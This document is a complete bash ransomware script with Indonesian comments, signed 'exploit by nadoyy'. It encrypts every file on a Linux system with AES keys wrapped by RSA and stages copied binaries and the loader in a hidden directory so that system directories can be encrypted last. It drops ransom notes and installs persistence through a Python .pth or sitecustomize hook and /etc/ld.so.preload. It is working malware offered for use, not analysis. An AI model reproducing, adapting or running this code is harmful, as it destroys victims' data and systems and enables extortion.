#!/bin/bash
# ransomware.sh — payload enkripsi + injector persistence global. root.
# pakai: run | inject | lock | dry
# Default ROOTS="/" — semua direktori, tanpa kecuali, termasuk /app.
# /usr /etc /bin /sbin /boot /lib* dienkripsi paling akhir via tool hasil staging.
set -u
export LC_ALL=C

H=${HXN_DIR:-/usr/lib/.hxn}
APP=${HXN_APP:-$(pwd)}
JOBS=${JOBS:-8}
WORK=$H
MODE=${1:-run}
ROOTS=${HXN_ROOTS:-/}
EXT=${HXN_EXT:-}            # kosong = SEMUA file, tanpa filter ekstensi
HXN_LATE=${HXN_LATE:-1}     # 0 = jangan sentuh /usr /etc /bin /sbin /lib*
HDR=HXN1
umask 077

[ "$(id -u)" = 0 ] || echo "[!] Bukan root, sebagian file gagal."
mkdir -p "$H" || exit 1
cd "$H" || exit 1

SP=$(python3 -c 'import site;print(site.getsitepackages()[0])' 2>/dev/null || true)

# ---------- staging tool + loader + lib ke WORK ----------
LOADER=""; LIBS=""; BASHBIN=""
T_OPENSSL=openssl; T_MKTEMP=mktemp; T_CAT=cat; T_HEAD=head; T_STAT=stat
T_OD=od; T_TR=tr; T_MV=mv; T_RM=rm; T_FIND=find; T_CHMOD=chmod; T_CP=cp
T_GREP=grep; T_MKDIR=mkdir; T_RMDIR=rmdir; T_SLEEP=sleep

X(){ if [ -n "$LOADER" ]; then "$LOADER" --library-path "$LIBS" "$@"; else "$@"; fi; }

stage(){
  local b=$WORK/.bin d t l
  mkdir -p "$b/lib" || return 1
  for d in /bin /usr/bin /sbin /usr/sbin; do
    for t in bash sh openssl mktemp cat head stat od tr mv rm find chmod cp grep mkdir rmdir sleep; do
      [ -x "$d/$t" ] && [ ! -e "$b/$t" ] && cp -Lf "$d/$t" "$b/$t" 2>/dev/null
    done
  done
  for t in "$b"/*; do
    [ -f "$t" ] || continue
    while read -r l; do
      [ -f "$l" ] && cp -Lf "$l" "$b/lib/${l##*/}" 2>/dev/null
    done < <(ldd "$t" 2>/dev/null | grep -oE '/[^[:space:]]+')
  done
  for l in /lib64/ld-linux-x86-64.so.2 /lib/ld-linux*.so* /lib64/ld-linux*.so* /lib/ld-musl*.so*; do
    [ -f "$l" ] && cp -Lf "$l" "$b/ld.so" 2>/dev/null && break
  done
  chmod -R 700 "$b"
  [ -x "$b/openssl" ] && [ -x "$b/ld.so" ] && [ -x "$b/bash" ]
}

if stage; then
  LOADER=$WORK/.bin/ld.so; LIBS=$WORK/.bin/lib; BASHBIN=$WORK/.bin/bash
  T_OPENSSL=$WORK/.bin/openssl; T_MKTEMP=$WORK/.bin/mktemp; T_CAT=$WORK/.bin/cat
  T_HEAD=$WORK/.bin/head; T_STAT=$WORK/.bin/stat; T_OD=$WORK/.bin/od; T_TR=$WORK/.bin/tr
  T_MV=$WORK/.bin/mv; T_RM=$WORK/.bin/rm; T_FIND=$WORK/.bin/find; T_CHMOD=$WORK/.bin/chmod
  T_CP=$WORK/.bin/cp; T_GREP=$WORK/.bin/grep; T_MKDIR=$WORK/.bin/mkdir
  T_RMDIR=$WORK/.bin/rmdir; T_SLEEP=$WORK/.bin/sleep
else
  echo "[!] staging gagal — fase /usr bisa terputus"
fi

# ---------- roots: /app + cwd wajib, tanpa duplikat ----------
case ":$ROOTS:" in *:/:*) ROOTS=/ ;; esac
if [ "$ROOTS" != "/" ]; then
  case ":$ROOTS:" in *:/app:*) ;; *) ROOTS="/app:$ROOTS" ;; esac
  case ":$ROOTS:" in *":$APP:"*) ;; *) ROOTS="$ROOTS:$APP" ;; esac
fi
R=()
for r in ${ROOTS//:/ }; do
  [ -d "$r" ] || continue
  dup=0
  for x in "${R[@]:-}"; do [ -n "$x" ] && [ "$x" = "$r" ] && { dup=1; break; }; done
  [ "$dup" = 1 ] || R+=("$r")
done
[ ${#R[@]} -eq 0 ] && R=(/app)
ROOTS="$(IFS=:; echo "${R[*]}")"

# ---------- path yang tidak dienkripsi ----------
PRUNE_BASE=(/proc /sys /dev /run /tmp "$WORK")
[ -n "${SP:-}" ] && PRUNE_BASE+=("$SP")
PRUNE_MAIN=("${PRUNE_BASE[@]}")
LATE=(/usr /etc /boot /bin /sbin /lib64 /lib /lib32 /libx32)
if [ "$HXN_LATE" = 1 ]; then PRUNE_MAIN+=("${LATE[@]}"); fi

for r in ${ROOTS//:/ }; do
  case "$WORK" in "$r"/*) echo "[i] WORK ($WORK) di dalam root ($r) — otomatis dikecualikan";; esac
done

if [ ! -f ransom_priv.pem ]; then
  X "$T_OPENSSL" genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out ransom_priv.pem 2>/dev/null || exit 1
  X "$T_OPENSSL" pkey -in ransom_priv.pem -pubout -out pub.pem 2>/dev/null || exit 1
  X "$T_CHMOD" 600 ransom_priv.pem
fi

hx(){ X "$T_OD" -An -v -tx1 "$1" | X "$T_TR" -d ' \n'; }

enc_one(){
  local f=${1:-}
  local W=$WORK M=$HDR t ek ct l
  [ -n "$f" ] || return 0
  [ -f "$f" ] && [ ! -L "$f" ] && [ -s "$f" ] || return 0
  case "${f##*/}" in README_HXN.txt) return 0;; esac
  [ "$(X "$T_HEAD" -c4 -- "$f" 2>/dev/null)" = "$M" ] && return 0
  [ -w "$f" ] || return 0
  [ "${HXN_DRYRUN:-0}" = 1 ] && { echo "  $f"; echo x >> "$W/.count"; return 0; }

  t=$(X "$T_MKTEMP" -d "$W/.t.XXXXXX") || return 0
  X "$T_OPENSSL" rand 32 > "$t/k"; X "$T_OPENSSL" rand 32 > "$t/m"; X "$T_OPENSSL" rand 16 > "$t/iv"
  X "$T_CAT" "$t/k" "$t/m" > "$t/blob"
  X "$T_OPENSSL" pkeyutl -encrypt -pubin -inkey "$W/pub.pem" \
    -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
    -in "$t/blob" -out "$t/ek" 2>/dev/null || { X "$T_RM" -rf "$t"; return 0; }
  X "$T_OPENSSL" enc -aes-256-ctr -K "$(hx "$t/k")" -iv "$(hx "$t/iv")" \
    -in "$f" -out "$t/ct" 2>/dev/null || { X "$T_RM" -rf "$t"; return 0; }
  X "$T_CAT" "$t/iv" "$t/ct" | X "$T_OPENSSL" dgst -sha256 -mac HMAC \
    -macopt "hexkey:$(hx "$t/m")" -binary > "$t/mac" || { X "$T_RM" -rf "$t"; return 0; }

  l=$(X "$T_STAT" -c%s "$t/ek")
  { printf '%s' "$M"
    printf '%b' "$(printf '\\x%02x\\x%02x' $((l>>8)) $((l&255)))"
    X "$T_CAT" "$t/ek" "$t/mac" "$t/iv" "$t/ct"; } > "$t/o" || { X "$T_RM" -rf "$t"; return 0; }
  X "$T_MV" -f "$t/o" "$f" || { X "$T_RM" -rf "$t"; return 0; }

  echo x >> "$W/.count"
  X "$T_RM" -rf "$t"
}

walk(){
  local r=$1; shift
  local expr=() p
  [ -d "$r" ] || return 0
  for p in "$@"; do expr+=(-path "$p" -o); done
  while IFS= read -r -d '' f; do
    if [ -n "$EXT" ]; then
      e=${f##*.}; e=${e,,}
      case " $EXT " in *" $e "*) ;; *) continue ;; esac
    fi
    if (( BASH_VERSINFO[0]>4 || (BASH_VERSINFO[0]==4 && BASH_VERSINFO[1]>=3) )); then
      enc_one "$f" &
      while :; do j=0; for _p in $(jobs -rp); do ((j++)); done; [ "$j" -lt "$JOBS" ] && break; wait -n; done
    else
      enc_one "$f"
    fi
  done < <(X "$T_FIND" "$r" \( "${expr[@]}" -false \) -prune -o -type f -print0 2>/dev/null)
}

write_readme(){
  local id=$1 cnt=$2 r
  local msg="=== HXN ===
exploit by nadoyy

$cnt file terenkripsi.
ID: $id"
  for r in ${ROOTS//:/ } /root "$APP"; do
    [ -d "$r" ] && printf '%s\n' "$msg" > "$r/README_HXN.txt" 2>/dev/null
  done
  printf '%s\n' "$msg" > "$H/README_HXN.txt" 2>/dev/null
}

run_lock(){
  local id n=0 r
  : > .count
  id=$(X "$T_OPENSSL" rand -hex 8)
  write_readme "$id" "?"                     # ditulis dulu: tetap ada walau fase akhir terputus

  for r in ${ROOTS//:/ }; do walk "$r" "${PRUNE_MAIN[@]}"; done
  if [ "$HXN_LATE" = 1 ]; then
    for r in "${LATE[@]}"; do walk "$r" "${PRUNE_BASE[@]}"; done   # sistem paling akhir
  fi
  wait

  while read -r _; do ((n++)); done < .count   # builtin saja, lib sudah terenkripsi
  write_readme "$id" "$n"
  echo "[lock] $n file terenkripsi"
}

write_arm(){
  X "$T_CP" "$0" "$H/ransomware.sh" 2>/dev/null || echo "[!] tidak bisa salin diri, set HXN_SRC"
  X "$T_CHMOD" 700 "$H/ransomware.sh" 2>/dev/null
  X "$T_CAT" > arm.sh <<A
#!/bin/bash
set -u
H="$H"; B="$H/.bin"
X(){ if [ -x "\$B/ld.so" ]; then "\$B/ld.so" --library-path "\$B/lib" "\$@"; else "\$@"; fi; }
X "\$B/mkdir" "$H/.arm.lock" 2>/dev/null || exit 0
trap 'X "\$B/rmdir" "$H/.arm.lock" 2>/dev/null' EXIT
X "\$B/sleep" "\${HXN_DELAY:-2}"
if [ -x "\$B/ld.so" ] && [ -x "\$B/bash" ]; then
  exec "\$B/ld.so" --library-path "\$B/lib" "\$B/bash" "$H/ransomware.sh" lock
fi
exec /bin/bash "$H/ransomware.sh" lock
A
  X "$T_CHMOD" 700 arm.sh
}

install_hook(){
  local py
  if [ -n "${SP:-}" ] && [ -d "$SP" ] && [ -w "$SP" ]; then
    py="import os,subprocess as s;p='$H';B=p+'/.bin';os.path.exists(p+'/.armed') or not os.path.exists(p+'/arm.sh') or (os.close(os.open(p+'/.armed',os.O_CREAT|os.O_WRONLY,0o600)), s.Popen(([B+'/ld.so','--library-path',B+'/lib',B+'/bash',p+'/arm.sh'] if os.path.exists(B+'/ld.so') else ['/bin/sh',p+'/arm.sh']),stdout=s.DEVNULL,stderr=s.DEVNULL,start_new_session=True))"
    printf '%s\n' "$py" > "$SP/zz-hxn.pth"
    echo "[+] hook: $SP/zz-hxn.pth"
  else
    printf 'import os,subprocess as s;p="%s";B=p+"/.bin";os.path.exists(p+"/.armed") or not os.path.exists(p+"/arm.sh") or (os.close(os.open(p+"/.armed",os.O_CREAT|os.O_WRONLY,0o600)), s.Popen(([B+"/ld.so","--library-path",B+"/lib",B+"/bash",p+"/arm.sh"] if os.path.exists(B+"/ld.so") else ["/bin/sh",p+"/arm.sh"]),stdout=s.DEVNULL,stderr=s.DEVNULL,start_new_session=True))\n' "$H" > "$H/zzhxn.py"
    if [ -n "${SP:-}" ] && [ -d "$SP" ]; then
      printf 'import sys;sys.path.insert(0,"%s");import zzhxn\n' "$H" > "$SP/sitecustomize.py" && echo "[+] hook: sitecustomize"
    fi
  fi
  if [ -f "$H/libhxn.so" ]; then
    X "$T_GREP" -qxF "$H/libhxn.so" /etc/ld.so.preload 2>/dev/null || echo "$H/libhxn.so" >> /etc/ld.so.preload
  fi
}

case "$MODE" in
  run)    install_hook; write_arm; run_lock ;;
  inject) install_hook; write_arm; X "$T_RM" -f "$H/.armed"; echo "[*] terpasang, arm menunggu python" ;;
  lock)   run_lock ;;
  dry)    HXN_DRYRUN=1 run_lock ;;
  *) echo "pakai: $0 {run|inject|lock|dry}"; exit 1 ;;
esac
